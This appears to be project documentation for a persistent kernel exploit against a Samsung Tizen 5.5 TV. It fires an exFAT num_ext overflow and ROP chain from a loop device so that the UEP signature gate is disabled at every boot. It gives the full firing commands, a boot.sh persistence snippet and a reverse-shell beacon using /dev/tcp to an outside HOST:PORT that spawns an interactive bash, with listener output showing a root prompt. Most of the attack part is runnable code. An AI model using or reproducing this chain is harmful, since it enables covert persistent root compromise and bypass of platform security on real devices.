# Stickless, persistent UEP exploit — loopback firing (TV-agnostic)

The UEP exploit image is block-device agnostic. Fired from a **loop device**
instead of the USB stick it patches the kernel exactly the same way: same
exFAT `num_ext` overflow, same ROP chain, same firmware-specific addresses —
only the block device differs. The stick is needed once, to carry the image
onto the TV; after that every cold boot takes UEP down with no USB hardware
present. The exploit is therefore **stickless and persistent**.

Field-verified 2026-10-25 on a QN55Q90TAFXZC (NikeM,
T-NKMAKUC-REL-202505100505, Linux 4.1.10 armv7l, Tizen 5.5). The technique is
TV-agnostic: the only per-platform component is the ROP/address set baked
into the image, which the loopback layer does not touch (cf.
`docs/uep-bypass.md` for the gate patch).

## Why the stick had to go

UEP-down at boot is a hard requirement — the persistent root runtime
(unsigned `/opt/bin` binaries, e.g. `dropbearmulti` on :22) is refused by the
UEP gate while it is up. Keeping the stick in the TV full-time caused a chain
of field problems, all reproduced:

- **Filesystem I/O hangs.** Samsung's storage stack mounts the crafted p1 as
  `/opt/media/USBDriveA1`; reads of that mount hang, and because `df`
  enumerates mounts, a plain `df` hangs system-wide. Any mount-table walker
  stalls.
- **The standby/wake wedge.** Wakes across the post-standby poweroff boundary
  landed the TV in a half-state (power_state 6, SSH alive, display dark,
  remote dead) recoverable only by mains-cycling; the wake path's USB
  re-mount against the parked exFAT state is one candidate cause. With the
  stick retired the TV powers fully off at standby and cold-boots cleanly.
- **Unbinding hangs the kernel.** `echo 2-1 > /sys/bus/usb/drivers/usb/unbind`
  blocks inside the USB disconnect path (the live exFAT mount holds busy I/O)
  and wedges the VFS; only `umount -l` recovers. Auto-eject-after-boot was a
  dead end.
- **Physical dependence.** A missing stick at boot means UEP stays up,
  dropbear never starts, and the TV has no remote access at all.

Loopback firing removes the device while keeping the exact same kernel stage:
same image, same exFAT driver, same ROP addresses.

## Why a loop device works

The `num_ext` overflow lives in `ffsReadDir` and needs a **directory read**,
not merely a mount (`exploit-004` §0 in `samsung-tv-usb-root`, confirmed
again in the field):

- `mount -t exfat /dev/loopN /tmp/uep-t` completes **cleanly**, regardless of
  mount options (the storage stack's `nosuid,noexec,noatime,dirsync,gid=10001,
  fmask=0111,dmask=0000,allow_utime=0022` set was tried — same clean mount).
- The first **readdir** of the crafted directory (`ls /tmp/uep-t`) overflows
  the frame, runs the ROP chain, patches UEP, and **parks its kernel thread**.
  The read then hangs in D-state forever — the hang IS the success signature
  (the chain's park gadget deliberately never returns). One parked thread per
  firing; invisible to userspace; freed at reboot.
- The stage's beacon (`exec 9<>/dev/tcp/HOST/PORT; echo UEP DOWN >&9; bash -i…`)
  connects after the patch. With a listener on HOST:PORT the proof is literal:

      $ nc -l 4444
      UEP DOWN
      bash-3.2#

  Without a listener the beacon bash exits silently — no lingering process.

## Procedure

```sh
# one-time: image to /opt (raw transfer only — NEVER mount it on macOS,
# fsKit defuses the trigger)
ssh root@TV 'cat > /opt/usr/share/tvroot/nikem-usb-uep2.img' < out/nikem-usb-uep2.img

# firing (as root)
LP=$(losetup -f)                                  # /dev/loopN, offset = p1 LBA 2048
modprobe exfat_fs                                  # module may not be loaded stickless
losetup "$LP" -o 1048576 /opt/usr/share/tvroot/nikem-usb-uep2.img
mkdir -p /tmp/uep-t
mount -t exfat "$LP" /tmp/uep-t                   # completes cleanly
( ls /tmp/uep-t >/dev/null 2>&1 & )               # fires the chain; hangs = success
( sleep 30; umount -l /tmp/uep-t 2>/dev/null ) &  # detach after UEP is down
```

## Boot-time integration (deployed, verified)

Appended to the tvroot `boot.sh` (executed by content through the profile.d
hook; signed system binaries only — `losetup`, `modprobe`, `mount`, `mkdir`,
`ls`, `sleep`, `umount`; POSIX shell):

```sh
if [ -f /opt/usr/share/tvroot/nikem-usb-uep2.img ] && [ ! -e /run/uep-fired ]; then
  (
    LP=$(losetup -f 2>/dev/null)
    [ -n "$LP" ] || exit 0
    modprobe exfat_fs 2>/dev/null
    losetup "$LP" -o 1048576 /opt/usr/share/tvroot/nikem-usb-uep2.img 2>/dev/null || exit 0
    mkdir -p /tmp/uep-t
    if mount -t exfat "$LP" /tmp/uep-t 2>/dev/null; then
      : > /run/uep-fired 2>/dev/null
      read up rest < /proc/uptime 2>/dev/null
      echo "=== loopback uep fired at uptime=${up%%.*}s on $LP"
      ( ls /tmp/uep-t >/dev/null 2>&1 & )
      ( sleep 30; umount -l /tmp/uep-t 2>/dev/null ) &
    else
      losetup -d "$LP" 2>/dev/null
      echo "=== loopback uep mount failed on $LP"
    fi
  ) >>/opt/usr/share/tvroot/uep-loop.log 2>&1 &
fi
```

Guards: `/run/uep-fired` is created only after the mount succeeds, so the
chain fires exactly once per boot; a failed mount detaches the loop and the
boot continues (degraded: UEP stays up, no unsigned binaries).

## Verification (stickless boot, 2026-10-25 23:38)

- `uep-loop.log`: `=== loopback uep fired at uptime=2s on /dev/loop0`
- USB enumeration: only the TV's own Wireless_Device (04e8:20b6); no stick
- dropbear up (~60–90s, via the existing retry loop)
- `mount` table clean after the 30s lazy-unmount; `df` instant; exactly one
  D-state `ls` parked thread

## Caveats

- Never mount or "repair" the image on macOS/fsKit — it defuses the trigger.
  Transfer raw bytes only.
- Firing twice in one boot parks two threads and re-applies the patch; the
  guard prevents it, but manual testing should be deliberate about it.
- Loop allocation is dynamic (`losetup -f`); grabbing an early loop just
  shifts the squashfs mounts to the next free device.
- The parked thread holds the loop device and the exFAT superblock until
  reboot; nothing in the mount namespace remains, so nothing can hang on it.
